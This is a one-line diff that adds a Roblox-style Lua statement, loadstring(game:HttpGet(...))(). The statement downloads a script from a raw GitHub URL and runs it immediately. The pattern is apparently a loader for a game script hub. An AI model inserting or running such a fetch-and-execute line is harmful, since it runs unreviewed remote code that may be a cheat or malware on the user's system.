@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/vesperLua/FeudalDiana-TSK/main/Main')))()
